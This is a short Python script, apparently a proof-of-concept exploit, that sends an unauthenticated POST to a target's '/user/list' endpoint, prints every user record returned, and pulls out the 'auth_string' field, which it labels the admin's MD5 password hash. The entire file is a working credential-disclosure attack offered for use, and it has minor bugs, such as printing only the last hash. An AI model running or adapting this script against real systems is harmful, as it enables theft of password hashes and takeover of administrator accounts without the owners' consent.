import requests,argparse

parser = argparse.ArgumentParser(description='What the program does')

parser.add_argument('--host', action='store', required=True, type=str)
parser.add_argument('--port', action='store', default=20011, type=str)
args = parser.parse_args()

url = "http://%s:%s/user/list?culture=en-us" % (args.host,args.port)

try:
    res = requests.post(url, json={'total': '0', 'pageIndex': '1','pageSize': '20'})
except requests.exceptions.ConnectionError:
    print("url connection error")

data = res.json()
admin_row = data['data']['rows']

print("==FULL DATA==")
print(admin_row,'\n')

for get_hash in admin_row:
    hash = get_hash['auth_string']
print("ADMIN HASH PASSWORD IN MD5", hash)
